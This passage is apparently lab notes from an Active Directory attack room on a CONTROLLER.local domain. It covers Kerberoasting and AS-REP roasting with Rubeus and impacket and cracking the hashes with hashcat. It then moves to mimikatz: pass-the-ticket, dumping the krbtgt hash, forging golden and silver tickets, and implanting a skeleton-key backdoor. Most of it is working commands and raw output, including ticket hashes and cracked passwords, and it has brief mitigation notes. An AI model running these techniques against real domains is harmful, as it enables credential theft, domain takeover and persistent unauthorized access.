                             9063D59DB24A985882F078B24B5D89E18F9CDE7487581317DDFC1AB845C23EB39CDA021E8FC27EB6
                             BD64FB7BCCF498583DC44B00B0A40006AD47C2507445D663A1CF67C10C


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo 
                             cal:30222*$6006501876AC679991F757955B7C3332$99F019BEDDB0BA7288B623CD81487C6365AC 
                             C00EC3869EC486F0CAD49132977E9ADF0832B01953122188643760EB7CC844B88C59AD93C8ED8D85
                             376F10AC8A886F06EF29FCC0401965D719F8C5ADD4E677CDE43505C6417DD16BD72A1F5594492B91
                             DA2501C2BFBBB2B1CAA431E783DFF9B514285AE07A74750FA980BF34DE766EED0DCD3B1023A0C1C8
                             E223B8F55592691D47C8DBEE2CAC7CA4353E7BB46928D4650AAD4BF4D19979B31DFCF6960E31B0E7
                             1061BD6D16DB714A95BB7EAADDA0356CDA4973A3BDE6917D63FF2A631B278965E003408C165E4038
                             9BC22DD030A7AB8EE62BA0F34AFEC24BAE033946E226E142DB4432FDB1F20E57478679868726A94C
                             9CB672B9294418D37B79D7CE9D113DA70A90A7B502A562DF67FE191BE7D46BC6D7A35CA705A6578F
                             992E0F54CC53BE93C04528469009B69E4F7E0FE19487AB1CC861B94619739CACAA4F6795B8006D7F
                             73876528DCB3265CDD7CD671058E8D923E1500C08F6220BBE1B5833510683FBDADF6613D36B2B35F
                             2F817B0667777DB00A5115C61139FEACD2A56D2EC691C35288A7159FA88A40B1024D78E5529912C4
                             06153366C6B671DEA3F8CA26A6D996545DFBE075AFEB0B1AF2E2EBBED18E1F5B09854F80C71B85D0
                             0C48A869BBDEB0319D60E7592A2070880EA925A2EE914E23287F2636C72882293E970EB6801C0D85
                             30CD05901ACD8747FC2D59464AB493C22C7E7DAA51696C50A3C488E173410D6F6C0E6E385C566EEE
                             4471536758798817E90D78DF8F9A865F83BBE058783DBA2AF1B16549B9AF9CA0C288981A45E61BB2
                             B25909126E1C495C2319B2FD347013FEBB8FEDE75A5745A3FA72AB062E14758B4463A49FDEF63217
                             84ADD9384F853E01279DBCDEF9BF1AE910AA48675A0B2A41DF27987C7BE0BF5D75C5593415669315
                             CF9C3D30385D4FE73F94154D1E6B68646A6A5FDF6EDAF40EB94245629368E91EADE9293DD9163098
                             77B4FB0D2D5FCBE9B6F16C39696E5F523EC0127945AD1C92CF93D5FB13EB885109F5E10430BEA01B
                             5C82FEEBBE07CB4FC692BA23D5E0DF19571AA0E7611754F97C40D346125E7403080E81C764929324
                             E414285F7E11072729798822AE7583266349C95ADAFC724AACBCCAFA690F59F1E0629953BCEF8C08
                             F4CDC986E1FE4277D29BC2A42B86E6127B6D69CF6D8FAED775AE66B3604A3408238E01AE7AD15DFF
                             8377E8BE567C152C3AF366304E3670E39B3B0497CA34F141A51C7BBE4A871902F1D7D87E27EF7178
                             DCC5D13248E0ECBA53C2AD3FADEC620F85EDF69EAEDB5F4C12460645D89D90459AD39E9E108A619E
                             3F032B002C186D02A91D39D5BD33E7D706F74ADE75B5E257EFB5FF199BC554C903539E6635514ED2
                             7269714E8741B224D41EDF9581388DAF48A4334977EA38CDC21786B5207FD1FB5217DD3418130607
                             B8BE076FC6223BAE1CF51008B08056A80FF742DFD38AE78FC473743C8A6D050616B4729FB671478B
                             2FF9598A70E0724787E5633E0764218284ECF55097E09738C591A15FC352841A8EBFD44F49E38F16
                             617E3965B35C95C491F70F670FCE0D6902AE427FC438AFC937F24ECE489DAFBC56E59F7EF55A8D31
                             17F326573BE17D09C2CF3BEB3D8164768D957211D87A48FE0E83CBEEDB85
```

## With impacket

python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.112.157 -request

```
ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 18:28:26.922527  2020-05-25 18:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 18:39:17.578393  2020-05-25 18:40:14.671872             



$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$ffe1487528f9a4d9b18e299007524e88$92fd5077ed2e5ef31668eddb05da12fc45e3a03aa82e7c360bfb25a9ec827206b9c8122dc94cbeac233bb7818b65d0c1690990063401d57014f39be5e181a01134c3791a6f31e2d9e8b91832a31635159b5a5ea228636c29c19634b4c7873a4f6c3d7adae7167f73f948e7725bd1398fff19b20fab7899fd3e248e1929ccc4fa3380ecfbb8c405efa20091aa80e8e85d3be64992e14358c9072f366561a2a6f605e0de033cd1837122b080d29559bfd16972a344539b021e774ae33e8ce317c81b2c9ecd90d9cba0dbf0c4ee496d61518be44aa258fdc0387aeca388de08974621ac0bd46a1e787ce5db36a97841ae0259e1686a73c6f6542194e0c7dd25c6d61cff0fb2535505543558feb73bc2261efdd857737d7ac1393f1323eade539d3cd3732c7afa6bc90fcd2a236750aa23bda351d8d3322dd13c56498f6b546950844c61d9acbf13968dad332f34f990525333fe4941ea74ace1a623a9949569dafa98b59777d28f3a06ef3d2db88203c6db9c2e9795c166bea288d08723ecb1ce389cc0971aaa28aec5c2a8cc527d1cd7f95368dc5b5b52d6f7aaf6aac16f339610aa52c072a2e57baa7495f6d221dab5468657b31c2e1893ecd5cf09e53394c57bdd3d86722f009df17beac0d8dd2a716e5d37f3bcace10de62beb65950992da1c26542968ccdd6c1aee48df407dcc358b91447ab990cc317f2beb51ee508ad2cd67bf87a862a607983c10013ae126467c71d046f2bf09480003845a4afed65266177353ff48d2877008376cfec802ea0bd76da7c0d08648c4a1ab2f106435dad9410e9e9fc9ab091e64f868838c9541a960b8ee42fb43cab18f5d10821ebf7798254eff7c9a36320a0a5c1fdd9bbd12303d5e8236e82c642b0794aada77ddf6fd1a201b4b89c909b3998cb7451d4d21d02e7cd40fc445809e89be705bb0b5adf5f3f6e1ca8db39bb227b5527dbf45c399458aaeba6359a17b6df2352aa6ed92ed0ea5e59c6e09b1c4f15a199052b95e3c47ea350d0cfa4ffe5f2008d0416d56d5a2565420d8338a969b1f906b57054d903ffc4cbcfb09adbe18af127221121b9a1af0e06da97eabd0ae8f5512c8812641d96af70cf13a1c304970ac7a0a83020bd6a89b7c7aaa7d3b08e1ad0983a93052fde58abcbc8e25f7aba3d9ed09bf2e3d1dce8f24d21c0377446f4271af1def1e6f512c516fdd98c743713db44f17b70922f0fcc914217ffdf464a09666912bf0d07491bcbf6b25e83ae757b7b17b33bef15d82c504e5782b45850f5daf3e4ca5e4bcd6e87c6d381931300abb92eac057fbfb25ed2daa2c1a254a8f15f6f4eb073580f920ec8517f26060c363c8f4125774a2084ca30993116f0bd690cb3100b6f0
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$921368f8f89f0f8d131b424df5c90a91$589dcca79b883c4593300b6c10fb0e67c689c553cef386d812c9e8eda2f1e5a92da64c1f43b91803b24b920a6d17671b292449c092338d7ce726f2df95f88f52d928cd44644c8f3cde35b02b981351634a4c95587e3cd58de11c7d7d611291030d6f14c4de940963952710d318809b1f82c2862b351562139ad1e63faba73aef3d1f12f40992a671c7a3975407d95d98df871a6b711c8b4a96af41fceb18cb0e8be67577258aed6cc3be36f1dd26973d2d684154e49cfe0a9ec264091875467630d8cdc97b59ef996800095f5f5c5d7cc67705fbf763924581553279de6a27e1510df58612c85225ccb0c0ab0156c314a0b0f3ebded2f97d7fe913f0be7f2c72366bfc08cdd3b8236f55746379461388b6677e88cf6d8f0cc6edd54d87e041f9dbc0e83dec61a1efe52ba618f9b1203256285595bfa82026fc5a97ca15aae05c87e911c8bc7bb7bdb78e18ef018ee67084acb8e47c0428d2339604e7f1d707cc7b10dc91f43703d188c81085c041545d510f78efdd368fd0ac68eb30400d1fd7ecad8de092ef47a21589ddc73fc5697841f5392fd00a0f78fccf6fa0fd4a0edb0d3359fc36a2a5d94b5a61ecab8321bc462a9f4673be02e7fba986fc9d416669733fabca5a0b272ee62db55a82f1dc17efa68e38dcdb0cc2f14f0dd58ecd03cdf590968decd5c1aa59b3da41a3b3ba7dff462164424ec8c8e299a73351efe39999b34db6703c1400b261e1cf6349afc46287e220a5b150a3e0f11f574a53375f99fd130d821481707c14b8ff6f0798cc1586499579539a8a1562c1909e0f5be49b151be0c49ab47d66a6749aacd0b024f8649cef7eb8a5e194456aec658d45034e4adb8c9ea742488f94f4f4959409e89f8aefc3f03152ca3485004d4c52f568a589cc59a2457342e3f48f0338b795086d716bdcd4fa66fec74d842549760c797a95548e555a98b3806ca57b93c4092f46a7920662cde8783c23241172309954b3bfe61e49491c6780108c83865e69db85194f07c17720ab6cd6114d24c77de1939133daa0849861d37194738afbbcce5ada0103edae39789ae839f6b0c2301570b45776d668afe4e43405852ff3ca7e10805661f91e4507d11e126f45187a36d9b5af790bcc392ee091d1f0f4d34c99b30da7b241b7d33c35a726820fcb27d18473762b6b4458ad7f4c9fe7c0c640c708d6bad65b9a17e59ae04518db09c5d801fc1c37536f0c6439f0d303a0f91886fd89a496e6a7ec2a4f51f323677c62e6ee289db84de47ac5cfc2f6e7dfd0842ec89e5af4dfeb47506b85b038ac70d3d4248a0692ccf502eced11d01a2d7ab15581cbfb71a15d5513a252bdefab517a231d8d6c035a883d2d3e96ec123c3bb9c64d
```

Let's crack both the passwords.

hashcat -m 13100 -a 0 SQL_hash.txt Pass.txt => `MYPassword123#`
hashcat -m 13100 -a 0 HTTP_hash.txt Pass.txt => `Summer2020`

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

# Kerberoasting Mitigation

1. Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
2. Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

# AS-REP roasting with Rubeus

**Note: Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled. Other tools are kekeo and Impacket's GetNPUsers.py**

## Pre-authentication

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

. .\Rubeus.exe asreproast

```
[*] Target Domain          : CONTROLLER.local 

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2 
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local 
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::25b3:5b96:f29b:53a6%5) 
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful! 
[*] AS-REP hash: 

      $krb5asrep$Admin2@CONTROLLER.local:141C8BC0486C1E108A2D294E2AD59984$F212FE9F067D
      4D7F6FE0FE16A0031922582673B13919D2E4A90F727A127D8F50775D010B51A248DAEB70F55E7085
      BCFE6A41BDAC7B43A0619FE56DC1A0428F694A476D4E8A4CE5DD62D61ECD6F330F499EE6F96C51DA
      1AD8E348E492F0D2D62F6F97F32615F842AD16A0A004FF4C5A27235457984A1E8AE54D1609C92A95
      1B24EE029701E63656C4C9DD1377745BAD1A95B771A56C21512ADEDFE3E601F0E1C4CA2A212CFDBE
      F04CC05D48EF4E7DF26EBBA7A6C454778B5F8F8684A7977E7EA3B5988AD4A97E97296A3E0F98A0F5
      75E7494FA5904628B1524E028536120A365AD1639E4D1C3B8B28326C670DAB5E0EFF40B03195

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::25b3:5b96:f29b:53a6%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:0F12B2736C920D6CF5043DDE7535F33E$EDBC07FC20907
      4EF626D57136E57F72BD0E7F6B8F2699383D3600B2FB71A2FF7AA31871C5F8042670E402C46697D7
      7413DFB74A7C4CAD77CCE11E93C5A63172F6CF9FEAC949B615BA0058739B8A0691AF392B53A0C54E
      07E879921178003B242403A00AAFA2DE08CA5E9BC916BC1C95FFEF09A628FB4C052ED9BCDCD397BF
      5AFDAF4F33B2EE23F52AACA3AB01E93C45230F05D5171F98D7FF00E82AC4133A84B540F8E0A4E1B8
      2D1A0BF919D9DF3CA70738970DAEE13E59C1370FE9935C3BBD38A5273FC53B4DEBEA609937FEAA02
      814B7663EF53E73D34254615022B964CE1C337EC77C3A1E49D3F845E3A6C6FAF24609592F39
```

**Note: Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....**

hashcat -m 18200 -a 0 user3_asrep.txt Pass.txt => `Password3`
hashcat -m 18200 -a 0 admin2_asrep.txt Pass.txt => `P@$$W0rd2`

# Mitigation

1. Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
2. Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

# Pass the ticket w/ mimikatz

We are using mimikatz in order to dump a TGT from LSASS memory.

## Overview

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

# Mimikatz exploit

1. mimikatz.exe
2. privilege::debug => Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
3. sekurlsa::tickets /export => this will export all of the .kirbi tickets into the directory that you are currently in

```

Authentication Id : 0 ; 251330 (00000000:0003d5c2)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1 
Logon Time        : 4/29/2021 6:33:16 AM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 4/29/2021 6:36:28 AM ; 4/29/2021 4:33:16 PM ; 5/6/2021 6:33:16 AM
           Service Name (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;  
           Session Key       : 0x00000017 - rc4_hmac_nt
             9339a213ebccfe8e8358a330b3874812
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;3d5c2]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~30222.kirbi !
         [00000001]
           Start/End/MaxRenew: 4/29/2021 6:36:28 AM ; 4/29/2021 4:33:16 PM ; 5/6/2021 6:33:16 AM
           Service Name (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL 
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             eb5f59b1ebe886d6a5af342a193cd9b1
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;3d5c2]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket 
         [00000000]
           Start/End/MaxRenew: 4/29/2021 6:33:16 AM ; 4/29/2021 4:33:16 PM ; 5/6/2021 6:33:16 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             03d1eae72e5bd378eccdfd3b492aac54cb8fc93847e3820f9131328cf2a062b9
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3d5c2]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !
```

4. (PS) klist => Here we're just verifying that we successfully impersonated the ticket by listing our cached tickets. 

```
Cached Tickets: (3)

#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/29/2021 6:33:16 (local)
        End Time:   4/29/2021 16:33:16 (local)
        Renew Time: 5/6/2021 6:33:16 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/HTTPService.CONTROLLER.local:30222 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize  
        Start Time: 4/29/2021 6:36:28 (local)
        End Time:   4/29/2021 16:33:16 (local)
        Renew Time: 5/6/2021 6:33:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

#2>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/SQLService.CONTROLLER.local:30111 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/29/2021 6:36:28 (local)
        End Time:   4/29/2021 16:33:16 (local)
        Renew Time: 5/6/2021 6:33:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1
```

# Pass-the-ticket Mitigation

Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

# Golden/Silver Ticket Attacks with mimikatz

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

# KRBTGT vs TGT 

A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

# Golden/Silver Ticket Attack overview

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

# Golden/Silver Ticket Attack

## Step 1: Dump krbtgt hash

`lsadump::lsa /inject /name:krbtgt` => his will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

```
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6 
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead 
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b 
    21  bffaf3c4eba18fd4c845965b64fca8e2
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f 

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223
```

kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500

This command creates a golden ticket and to create a silver ticket we have to put service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

`misc::cmd` => this will open a new elevated command prompt with the given ticket in mimikatz.

# Dumps NTLM hash 

1. lsadump::lsa /inject /name:SQLService
2. lsadump::lsa /inject /name:Administrator 

# Kerberos backdoor with mimikatz

Kerberos backdoor acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 
The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

## Overview 

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

# Installing the Skeleton Key w/ mimikatz 

1. misc::skeleton
To access the forest we have default credentials will be: "mimikatz"
2. net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password
3. dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.

# References

https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
https://www.varonis.com/blog/kerberos-authentication-explained/
https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf

# Tool

Rubeus => https://github.com/GhostPack/Rubeus